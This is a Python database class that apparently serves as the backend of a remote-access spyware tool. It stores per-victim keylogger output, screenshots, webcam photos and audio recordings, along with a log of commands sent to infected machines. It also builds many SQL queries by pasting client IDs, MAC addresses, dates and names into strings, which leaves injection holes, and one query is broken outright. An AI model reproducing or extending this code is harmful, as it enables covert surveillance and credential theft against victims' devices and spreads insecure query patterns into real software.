            self.connect_db()

        # Initialize the WHERE clause and parameters list
        where_clause = []
        params = []


        # Extract the filter dictionary from kwargs
        filter_dict = kwargs.get('filter', {})

        for column_name, filter_info in filter_dict.items():
            condition, search_value = filter_info[0], filter_info[1]

            # Handle different conditions and column types
            if condition == "is equal to":
                where_clause.append(f"{column_name} = ?")
                params.append(search_value)
            elif condition == "is not equal to":
                where_clause.append(f"{column_name} != ?")
                params.append(search_value)
            elif condition == "contains":
                where_clause.append(f"{column_name} LIKE ?")
                search_value = f"%{search_value}%"
                params.append(search_value)
            elif condition == "is in":
                # Split the input string by commas to create a list of values
                search_values = [value.strip() for value in search_value.split(',')]
                placeholders = ', '.join(['?'] * len(search_values))
                where_clause.append(f"{column_name} IN ({placeholders})")
                params.extend(search_values)
            elif condition == "is greater than":
                where_clause.append(f"{column_name} > ?")
                params.append(search_value)
            elif condition == "is less than":
                where_clause.append(f"{column_name} < ?")
                params.append(search_value)
            else:
                # Handle other conditions as needed
                pass

        # Build the SQL query
        query = f"SELECT * FROM {table_name}"
        if where_clause:
            query += " WHERE " + " AND ".join(where_clause)

        # Execute the query with parameters
        tableData = self.connection.cursor().execute(query, params).fetchall()

        if self.connected:
            self.disconnect_db()

        return tableData

    def getTableImageTotal(self, table_name):
        if not self.connected:
            self.connect_db()

        count = self.connection.cursor().execute(f"""SELECT COUNT(*) FROM {table_name};""").fetchone()[0]

        if self.connected:
            self.disconnect_db()

        return count

    def get_client_infoByField(self, column, value):
        if not self.connected:
            self.connect_db()

        client_table = self.connection.cursor().execute(f"""
            SELECT * FROM client_info WHERE ? = ?
        """, (column, value)).fetchall()

        if self.connected:
            self.disconnect_db()
        return client_table

    def get_client_info_wID(self, client_id):
        if not self.connected:
            self.connect_db()
        client_table = self.connection.cursor().execute(f"""
            SELECT * FROM client_info WHERE client_id = {client_id}
        """).fetchone()
        if self.connected:
            self.disconnect_db()
        return client_table

    def get_config_file(self, client_id):
        if not self.connected:
            self.connect_db()

        client_config = self.connection.cursor().execute(f"""
            SELECT * FROM client_configs WHERE client_id == {client_id}
        """).fetchone()

        if client_config is None:  # If client config does not exist
            print("CONFIG DOES NOT EXIST")
            self.connection.execute("""
                INSERT OR IGNORE INTO client_configs(client_id, key_logger_enabled, data_server_enabled, favorite)
                VALUES(?, 1, 1, 0);""", (client_id,))
            self.connection.commit()

            client_config = self.connection.cursor().execute(f"""
                    SELECT * FROM client_configs WHERE client_id == {client_id}
                    """).fetchone()
        if self.connected:
            self.disconnect_db()

        return client_config

    def get_client_configs(self):
        if not self.connected:
            self.connect_db()

        client_configs = self.connection.cursor().execute(f"""
                   SELECT * FROM client_configs
               """).fetchall()

        if self.connected:
            self.disconnect_db()

        return client_configs


    def upload_offline_data(self, record):
        client_id = self.get_client_id(record[0])
        if not self.connected:
            self.connect_db()

        self.connection.execute("""
        INSERT OR IGNORE INTO keylog_data(client_id, log_data, date_info, offline_data)
        VALUES(?, ?, ?, 1);""", (client_id, record[2], record[4]))
        self.connection.commit()
        if self.connected:
            self.disconnect_db()

    def get_client_id_from_mac(self, mac_address):
        if not self.connected:
            self.connect_db()

        client_id = self.connection.cursor().execute(f"""
            SELECT client_id FROM client_info WHERE mac_address = {mac_address};
        """).fetchone()
        if not client_id:
            print('CLIENT ID NOT FOUND')
        else:
            client_id = client_id[0]

        if self.connected:
            self.disconnect_db()

        return client_id

    def upload_keylog_data(self, data):
        sID = data[0]  # Strips mac_address from data
        data = data[1]  # Strips log data from data
        client_id = self.get_client_id(sID)
        if not self.connected:
            self.connect_db()

        # Get the current timestamp with milliseconds
        timestamp_with_ms = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')

        self.connection.execute("""
        INSERT INTO keylog_data (client_id, log_data, date_info, offline_data)
        VALUES(?, ?, ?, 0);""", (client_id, data, timestamp_with_ms))
        self.connection.commit()
        if self.connected:
            self.disconnect_db()

    def log_command(self, client_id, command, status):
        if not self.connected:
            self.connect_db()
        utc_time_iso = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')
        self.connection.execute("""
         INSERT INTO client_commands(client_id, command, command_date, return_status)
         VALUES(?, ?, ?, ?);""", (client_id, command, utc_time_iso, status))
        self.connection.commit()
        if self.connected:
            self.disconnect_db()

    def getKeylogData(self, client_id, date_captured, day, month, year):
        if not self.connected:
            self.connect_db()
            # Convert the date_captured string to a datetime object

        # Build the SQL query to retrieve keylog data for the specified day
        query = f"""
              SELECT strftime('%H', date_info) AS hour, GROUP_CONCAT(log_data, '') AS keylogs
              FROM keylog_data
              WHERE client_id = {client_id} 
              AND strftime('%d', date_info) = '{day}'
              AND strftime('%m', date_info) = '{month}'
              AND strftime('%Y', date_info) = '{year}'
              GROUP BY hour
          """

        # Execute the query with parameters
        keylogData = self.connection.cursor().execute(query).fetchall()

        # Fetch the results and create a dictionary
        keylog_dict = {}
        for row in keylogData:
            hour = int(row[0])
            keylogs = row[1] if row[1] else "No keylogs for this hour"
            formatted_hour = date_captured.replace(hour=hour, minute=0, second=0).strftime('%I%p').lstrip('0')
            keylog_dict[formatted_hour] = keylogs

        return keylog_dict

    def upload_screenshots(self, client_id, screenshots):
        try:
            if not self.connected:
                self.connect_db()

            for screenshot in screenshots:
                screenshot_data = open(screenshot, 'rb')
                screenshot_data = screenshot_data.read()

                capture_time = screenshot.replace('=', ':')
                capture_time = capture_time.replace('_', '.')
                capture_time = capture_time[:-8] # Removes .png and millisecond from datetime string

                self.connection.execute("""
                    INSERT INTO screenshots(client_id, image, date_captured)
                    VALUES(?, ?, ?);""", (client_id, screenshot_data, capture_time))
                self.connection.commit()
                os.remove(screenshot)

            self.disconnect_db()

        except Exception as Error:
            print(Error)

    def upload_webcam_pictures(self, client_id, webcam_files):
        if not self.connected:
            self.connect_db()

        for photo in webcam_files:
            webcam_pic = open(photo, 'rb')
            webcam_pic = webcam_pic.read()

            capture_time = photo.replace('=', ':')
            capture_time = capture_time.replace('_', '.')
            capture_time = capture_time[:-8]  # Removes .png and millisecond from datetime string

            self.connection.execute("""
                 INSERT INTO webcam_pics(client_id, image, date_captured)
                 VALUES(?, ?, ?);""", (client_id, webcam_pic, capture_time))
            self.connection.commit()
            os.remove(photo)

        if self.connected:
            self.disconnect_db()

    def upload_audio(self, client_id, file_name, seconds):
        audio_clip = open(file_name, 'rb')
        audio_clip = audio_clip.read()
        self.connect_db()
        utc_time_iso = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')
        self.connection.execute("""
             INSERT INTO audio_recordings(client_id, audio_clip, seconds, date)
             VALUES(?, ?, ?, ?);""", (client_id, audio_clip, seconds, utc_time_iso))
        self.connection.commit()
        self.disconnect_db()

    def get_commands_name(self):

        self.connect_db()
        command_list = self.connection.cursor().execute("""
            SELECT command_name FROM command_desc;
        """).fetchall()

        commands = list()
        i = 0
        while i < len(command_list):
            commands.append(command_list[i][0])
            i = i + 1

        self.disconnect_db()
        return commands

    def get_command_info(self):
        self.connect_db()
        command_list = self.connection.cursor().execute("""
            SELECT * FROM command_desc;
        """).fetchall()
        self.disconnect_db()
        return command_list

    def get_command_info_wName(self, name):
        self.connect_db()
        command_list = self.connection.cursor().execute("""
            SELECT * FROM command_desc;
        """).fetchall()
        self.disconnect_db()
        return command_list

    def get_command_parameters(self):
        self.connect_db()
        command_parameters = self.connection.cursor().execute("""
            SELECT * FROM command_parameters;
        """).fetchall()
        self.disconnect_db()
        return command_parameters

    def get_command_parameter(self, command_name):
        self.connect_db()
        command_parameters = self.connection.cursor().execute(f"""
            SELECT * FROM command_parameters WHERE command = '{command_name}';
        """).fetchall()
        self.disconnect_db()
        return command_parameters